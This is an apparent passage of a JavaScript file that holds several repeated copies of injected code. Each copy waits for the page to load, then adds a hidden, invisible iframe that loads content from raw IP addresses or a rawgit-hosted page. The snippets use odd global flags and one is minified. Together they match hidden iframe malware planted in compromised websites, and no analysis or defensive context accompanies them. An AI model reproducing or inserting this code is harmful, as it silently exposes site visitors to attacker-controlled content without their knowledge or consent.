		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});